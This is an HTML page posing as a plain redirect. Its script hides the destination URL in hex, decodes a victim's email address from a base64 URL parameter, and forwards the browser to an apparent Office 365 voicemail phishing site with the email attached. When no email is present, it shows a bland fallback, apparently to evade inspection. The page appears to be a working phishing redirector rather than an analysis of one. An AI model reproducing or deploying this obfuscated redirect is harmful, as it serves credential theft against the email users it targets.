<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // Decode a base64-encoded string with error handling
        function decodeBase64(encoded) {
            try {
                return atob(encoded);
            } catch (e) {
                console.error("Invalid base64 encoding:", e);
                return null;
            }
        }

        // Check URL parameters for a base64-encoded value that decodes to an email
        function findEmailParam() {
            const urlParams = new URLSearchParams(window.location.search);
            for (const [key, value] of urlParams.entries()) {
                // Attempt to decode the parameter's value as a base64 string
                const decodedValue = decodeBase64(value);
                if (decodedValue && isValidEmail(decodedValue)) {
                    return decodedValue; // Return if itâ€™s a valid email
                }
            }
            console.warn("No valid email parameter found.");
            return null;
        }

        // Validate if the decoded value is a correctly formatted email
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        // Decode a hex-encoded URL
        function decodeHex(hexString) {
            return decodeURIComponent('%' + hexString.match(/.{1,2}/g).join('%'));
        }

        // Main execution
        const hexEncodedURL = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
        const decodedURL = decodeHex(hexEncodedURL);
        const email = findEmailParam();

        if (email) {
            // Redirect to the constructed URL with the email as a query parameter
            location.href = `${decodedURL}&email=${encodeURIComponent(email)}`;
        } else {
            // Display a fallback message if no valid email is found
            document.body.innerHTML = "<h1>Hi</h1>";
        }
    </script>
</body>
</html>
